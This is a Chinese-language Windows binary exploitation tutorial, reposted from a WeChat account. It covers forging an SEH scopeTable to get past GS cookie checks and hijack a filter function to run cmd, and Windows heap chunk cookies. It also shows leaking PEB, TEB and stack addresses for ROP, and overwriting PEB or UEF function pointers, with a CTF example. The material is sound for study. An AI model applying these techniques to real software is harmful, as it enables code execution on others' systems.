> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/2HeKfEq4uYxCBGKnqGJufA)

**安装 winpwn**
-------------

```
pip install winpwn
pip install pefile
pip install keystone-engine
pip install capstone


```

栈溢出
---

### 相关结构体

32 为系统下 SEH 结构体

```
//sehFrame
 _EH3_EXCEPTION_REGISTRATION struc ; (sizeof=0x10, align=0x4, copyof_4)
0x0 Next            dd ?                    ; offset
0x4 ExceptionHandler dd ?                   ; offset
0x8 ScopeTable      dd ?                    ; XREF: _main+21/w ; offset
0xC TryLevel        dd ?                    ; XREF: _main+57/w
0x10 _EH3_EXCEPTION_REGISTRATION ends


```

```
//scopeTable
_EH4_SCOPETABLE struc ; (sizeof=0x10, align=0x4, copyof_9, variable size)
0x0 GSCookieOffset  dd ?
0x4 GSCookieXOROffset dd ?
0x8 EHCookieOffset  dd ?
0xC EHCookieXOROffset dd ?
0x10 ScopeRecord     _EH4_SCOPETABLE_RECORD 0 dup(?)
0x10 _EH4_SCOPETABLE ends

```

```
//scopeTable_Record
_EH4_SCOPETABLE_RECORD struc ; (sizeof=0xC, align=0x4, copyof_8)
0x0 EnclosingLevel  dd ?
0x4 FilterFunc      dd ?                    ; offset
0x8 HandlerFunc     dd ?                    ; offset
0xC _EH4_SCOPETABLE_RECORD ends

```

### 触发异常源码

GS Cookies 验证代码

```
void __cdecl ValidateLocalCookies(void (__fastcall *cookieCheckFunction)(unsigned int), _EH4_SCOPETABLE *scopeTable, char *framePointer)
{
    unsigned int v3; // esi@2
    unsigned int v4; // esi@3

    if ( scopeTable->GSCookieOffset != -2 )
    {
        v3 = *(_DWORD *)&framePointer[scopeTable->GSCookieOffset] ^ (unsigned int)&framePointer[scopeTable->GSCookieXOROffset];
        __guard_check_icall_fptr(cookieCheckFunction);
        ((void (__thiscall *)(_DWORD))cookieCheckFunction)(v3);
    }
    v4 = *(_DWORD *)&framePointer[scopeTable->EHCookieOffset] ^ (unsigned int)&framePointer[scopeTable->EHCookieXOROffset];
    __guard_check_icall_fptr(cookieCheckFunction);
    ((void (__thiscall *)(_DWORD))cookieCheckFunction)(v4);
}


```

会验证两个条件：

```
1、framePointer[scopeTable->GSCookieOffset] ^ framePointer[scopeTable->GSCookieXOROffset]== __security_cookie
2、framePointer[scopeTable->EHCookieOffset] ^ framePointer[scopeTable->EHCookieXOROffset]== __security_cookie


```

要绕过这检查 1，可以伪造`scopeTable->GSCookieOffset=0xfffffffe`。但是对于条件 2，还没有办法。

异常触发函数

```
int __cdecl _except_handler4_common(unsigned int *securityCookies, void (__fastcall *cookieCheckFunction)(unsigned int), _EXCEPTION_RECORD *exceptionRecord, unsigned __int32 sehFrame, _CONTEXT *context)
{
    // 异或解密 scope table
    scopeTable_1 = (_EH4_SCOPETABLE *)(*securityCookies ^ *(_DWORD *)(sehFrame + 8));

    // sehFrame=Next, framePointer=ebp
    framePointer = (char *)(sehFrame + 16);
    scopeTable = scopeTable_1;

    // 验证 GS
    ValidateLocalCookies(cookieCheckFunction, scopeTable_1, (char *)(sehFrame + 16));
    __except_validate_context_record(context);

    if ( exceptionRecord->ExceptionFlags & 0x66 )
    {
        ......
    }
    else
    {
        exceptionPointers.ExceptionRecord = exceptionRecord;
        exceptionPointers.ContextRecord = context;
        tryLevel = *(_DWORD *)(sehFrame + 12);
        *(_DWORD *)(sehFrame - 4) = &exceptionPointers;
        if ( tryLevel != -2 )
        {
            while ( 1 )
            {
                v8 = tryLevel + 2 * (tryLevel + 2);
                filterFunc = (int (__fastcall *)(_DWORD, _DWORD))*(&scopeTable_1->GSCookieXOROffset + v8);
                scopeTableRecord = (_EH4_SCOPETABLE_RECORD *)((char *)scopeTable_1 + 4 * v8);
                encloseingLevel = scopeTableRecord->EnclosingLevel;//-2跳出后面的循环
                scopeTableRecord_1 = scopeTableRecord;
                if ( filterFunc )
                {
                    // 调用 FilterFunc
                    filterFuncRet = _EH4_CallFilterFunc(filterFunc);
                    ......
                    if ( filterFuncRet > 0 )
                    {
                        ......
                        // 调用 HandlerFunc
                        _EH4_TransferToHandler(scopeTableRecord_1->HandlerFunc, v5 + 16);
                        ......
                    }
                }
                ......
                tryLevel = encloseingLevel;
                if ( encloseingLevel == -2 )
                    break;
                scopeTable_1 = scopeTable;
            }
            ......
        }
    }
  ......
}


```

这里要劫持 filterFunc，就需要劫持 scopeTable。这需要满足两个条件：需要能覆盖掉 sehFrame 结构体，并且能泄露 securityCookies。

### payload

```
#伪造scopeTable
scopeTable = [
    0x0FFFFFFFE,    #GSCookieOffset
    0,              #GSCookieXOROffset
    0x0FFFFFFCC,    #EHCookieOffset
    0               #EHCookieXOROffset
]
scopeTable_Record = [
    0xfffffffe,     #EnclosingLevel=-2
    system('cmd'),  #FilterFunc 
    0
]
sehFrame = [
    Next,               #original
    ExceptionHandler,   #original
    scopeTable_addr,    #fake
    trylevel            #如果要伪造trylevel，就需要修改scopeTable，否则就不篡改，维持original
]
payload =  flat(scopeTable + scopeTable_Record)
payload += padding
paylaod += GS#___security_cookie 相当于canary
payload += Next + ExceptionHandler +scopeTable_addr + flat(sehFrame)#覆盖sehFrame结构


```

其中 GS 的位置计算方法如下：要满足`[ebp + scopeTable->EHCookieOffset] ^ [ebp + scopeTable->EHCookieXOROffset]=GS`，scopeTable 结构体的 EHCookieOffset 变量和 EHCookieXOROffset 变量所对应的 ebp 的偏移的位置的值抑或后等于 GS。因此通常将 EHCookieXOROffset 设置为 0，那么 GS 放置的位置就等于 ebp + scopeTable->EHCookieOffset。

### 64 位与 32 位的区别

1、windows 64 位程序函数调用的参数顺序依次为 rcx,rdx,r8,r9  
2、在调用 system(cmd.exe) 过程中，若出现`MOVAPS [rsp+0x4f0],xmm0`之类的错误而导致不能反弹 shell，这是因为 MOVAPS 指令需要 16 字节对齐，因此需要在 rop 链中修改 gadget 来调整栈空间

堆溢出
---

### 相关结构体

32 位下，chunk 头部字段信息

```
ntdll!_HEAP_FREE_ENTRY
+0  Size                    #chunk的大小，实际大小为Size*8
+2  PreviousSize            #前一个chunk的大小，实际大小*8
+4  SmallTagIndex           #用于检查堆溢出的Cookie
+5  Flags                   #标志位
+6  UnusedBytes             #用于对齐的字节数
+7  SegmentIndex            #所属堆段号
+8  FreeList    :[FD-BK]

```

```
Flags标志位：
0x01 Busy               #该块处于占用状态
0x02 Extra present      #该块存在额外描述
0x04 Fill pattern       #使用固定模式填充堆块
0x08 Virtual Alloc      #虚拟分配
0x10 Last entry         #该段最后一个堆块

```

SmallTagIndex 实际上是安全 cookie，算法如下：`_HEAP._HEAP_ENTRY.cookie=_HEAP_ENTRY.cookie^((BYTE)&_HEAP_ENTRY/8)`

Heap Entry 相当于 Linux 下的 chunk，windows 对前 8 个字节进行了加密，加密方式：与 HEAP 结构 0x50 偏移处 8 个字节抑或

例题：2020 强网杯 wingame

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2FIx5loqb2ib3r0Mur12IfskCMdvszDVK965cM4QwZtxIn0zAxYdbOHMSrh8DQXyjfINVnBib9KHIA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2FIx5loqb2ib3r0Mur12IfssgUpic4axia2jBXMbxWFkPNsWLOvBzVXNCBnufsY4qtEd4YUZypA5O0Q/640?wx_fmt=png)

例如 0xE50000 处为 HEAP 结构，其 HEAP+0x50 为解密密钥`0C5FBB3EFE5600`，而一般密钥都是 00 结尾

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2FIx5loqb2ib3r0Mur12IfsuNKnRvy9BjPQF5ttzDCpV83WcGxU20lYjvujFOSRz28d8a8YE1YC0w/640?wx_fmt=png)

将 chunk 的前 8 个字节与密钥逐位异或，得到`21000120 01020008`。size=0x21*8=0x108

**利用方式**

#### 1、修改栈返回地址 ROP（最常用）

首先需要实现任意读写，泄露栈地址的过程如下：  
ntdll -> ntdll!PebLdr 泄露 peb -> 计算处 teb -> 栈地址 -> 遍历查找 ret 地址

```
ret_content = base + 0x239a
ret_addr = 0
for i in range(stackbase,stackbase-0x1000,-4):
    if ret_addr==0:
        tmp = re(i)
        if tmp==ret_content:
            ret_addr = i
            break
assert ret_addr>0


```

_一段有用的 gadget : mov [rcx],rdx; ret_  
这段 gadget 可以在 ntdll.dll 中可以找到，如果配合上`pop rcx;ret以及pop rdx;ret`可以实现任意地址写并且在 rop 中传参时也能发挥很好的作用

##### 在 ida 中搜索 peb 偏移的方法：

现在微软应该是把在线符号表给墙了，因为某些原因不能科学上网（懒），所以在用 windbg 的时候无法下载符合本地系统的 pdb。这里我使用 x64dbg 进行调试。  
1、在 ida 中打开 ntdll，搜索函数 LdrQueryImageFileExecutionOptions，交叉引用找到调用它的地方，如下图所示：  

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2FIx5loqb2ib3r0Mur12IfsW8hCtmqibibjymv8Rb9UOEsxjzL3nSNqHIRrSWuXM5cEibv3Zib3GfSPWQ/640?wx_fmt=png)

2、在上面可以发现一个位于. data 的全局变量 peb_44（我自己命名的），然后找到它在. data 中的位置，如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2FIx5loqb2ib3r0Mur12Ifstj78oAa5cDUrPiaibQE8gmiaDTBicn3Zb0XQv4LdDswNVvgWjLDelSnEhw/640?wx_fmt=png)

3、可以看到 peb_44 的偏移为 ntdll+0x11dc54（这个偏移是我本机 win10 版本号为 18363 的 32 位 ntdll 的偏移）  
4、最后在调试器中定位到 ntdll+0x11dc54，可以看到一个 peb+0x44 的值，从而可以泄露 peb。

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2FIx5loqb2ib3r0Mur12IfskUPuY1Vv7cVZAQ1cv4JdH0r1sibj1oiaNiau0dMg0xjvPO8duABPiaOcbw/640?wx_fmt=png)

在 NT 内核系统中 fs 寄存器指向 TEB 结构，TEB+0x30 处指向 PEB 结构，PEB+0x0c 处指向 PEB_LDR_DATA 结构，PEB_LDR_DATA+0x1c 处存放一些指向动态链接库信息的链表地址，win7 下第一个指向 ntdl.dll，第三个就是 kernel32.dll 的。可以通过查看线程 TEB+0x30 的内容检查是否为正确的 PEB 地址或者查看 PEB+0xc 是否为 ntdll 中的地址。  
5、泄露栈地址  
PEB->TEB->stack  
PEB 和 TEB 的偏移是固定的，在本地调试中的偏移为 TEB=PEB+0x3000  
在 TEB 前三个指针都是栈的指针，第一个估计是 ebp 附近的 SEH_RECODE[1] 的地址指针，第二个估计是 stack base，第三个估计是 stack end。我们搜索栈空间寻找返回地址时，大概从 stack base-0x1000 开始搜索到 stack base 这一个页面的内容就行了。

##### 从 kernel32.dll 泄露 ntdll

如果原程序中没有 ntdll 的导入表，可以从 kernel32.dll 中泄露，方法如下（源自 https://xz.aliyun.com/t/6319#toc-4） ：  
可以从 kernel32.dll 中定位到 NtCreateFile 函数的偏移，因为 NtCreateFile 函数是从 ntdll.dll 的导入函数。在我 win10 18363 虚拟机中，偏移为 kernel32.dll+0x819BC。  
再进一步，如果只泄露了一个 dll 动态库的地址，只要其有其他 dll 库的导入函数，我们就有可能从其内存空间中泄露处其他 dll 库的地址。

#### 2、篡改 PEB 中的函数指针

PEB 结构中存放了 RtlEnterCriticalSection() 和 RtlLeaveCriticalSection() 函数指针，在程序正常退出时会调用 ExitProcess()，为了同步线程该函数又会调用 RtlEnterCriticalSection() 及 RtlLeaceCriticalSection() 进行处理。

```
//32位
RtlEnterCriticalSection = &PEB + 0x20;
RtlLeaveCriticalSection = &PEB + 0x24;


```

#### 3、UEF

系统默认异常处理函数（UEF，Unhandler Exception Filter）是系统处理异常时最后调用的一个异常处理例程，在堆溢出中，只需将这一地址覆盖为我们的 shellcode 地址即可。获取 UEF 地址的方法可以通过查看 SetUnhandledExceptionFilter() 的代码来定位，接着再找到操作 UnhandledExceptionFilter 指针的 MOV 指令

```
77E93114   A1 B473ED77      MOV EAX,DWORD PTR DS:[77ED73B4]  ;UnhandledExceptionFilter指针
77E93119   3BC6             CMP EAX,ESI
77E9311B   74 15            JE SHORT kernel32.77E93132
77E9311D   57               PUSH EDI
77E9311E   FFD0             CALL EAX

```

Reference
---------

Windows Pwn 学习之路

- https://www.anquanke.com/post/id/210394

作者：snowleopard****，文章来源：先知社区

**关注公众号: HACK 之道**  

![](https://mmbiz.qpic.cn/mmbiz_jpg/GzdTGmQpRic3qL1R1NCVbY1ElanNngBlMTUKUibAUoQNQuufs7QibuMXoBHX5ibneNiasMzdthUAficktvRzexoRTXuw/640?wx_fmt=jpeg)

**回复关键词：wg****，获取下载链接**

如文章对你有帮助，请支持点下 “赞”“在看”